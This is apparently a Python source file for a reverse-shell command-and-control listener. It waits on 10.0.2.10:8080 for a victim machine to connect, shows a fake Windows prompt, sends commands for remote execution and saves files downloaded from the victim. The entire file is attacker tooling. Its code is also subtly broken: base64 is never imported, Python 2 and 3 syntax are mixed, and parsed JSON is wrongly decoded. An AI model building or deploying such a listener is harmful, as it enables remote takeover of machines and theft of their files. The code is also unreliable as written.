import socket
import json

class SocketListener:
    def __init__(self,ip,port):
        listener = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)  # Use instance multiple times
        listener.bind((ip,port))
        listener.listen(0)
        print("Listening on port 8080...")

        (self.connection,address) = listener.accept()

        print("Listening established..." + str(address))

    #Sending Input
    def json_send(self,data):
        json_data = json.dumps(data)
        self.connection.send(json_data.encode())

    # Process Input
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.connection.recv(1024).decode()
                return json.loads(json_data)
            except ValueError:
                continue


    # Getting Input
    def command_execution(self,command_input):
        self.json_send(command_input)
        if command_input[0] == "exit":
            self.connection.close()
            exit()
        return self.json_receive()

    # Saving file
    def save_file(self,path,content):
        # content is base64 string, decode it back to bytes
        try:
            file_bytes = base64.b64decode(content)
            with open(path, "wb") as my_file:
                my_file.write(file_bytes)
                return "Download completed successfully"
        except Exception as e:
            return f"Error saving file: {str(e)}"

    def start_listener(self):
        while True:
            command_input = raw_input("Windows C:\\User\\IEUser\\> ")
            command_input = command_input.split(" ")
            command_output = self.command_execution(command_input).decode()

            if command_input[0] == "download":
                command_output = self.save_file(command_input[1],command_output)

            print(command_output)

socket_listener = SocketListener("10.0.2.10",8080)
socket_listener.start_listener()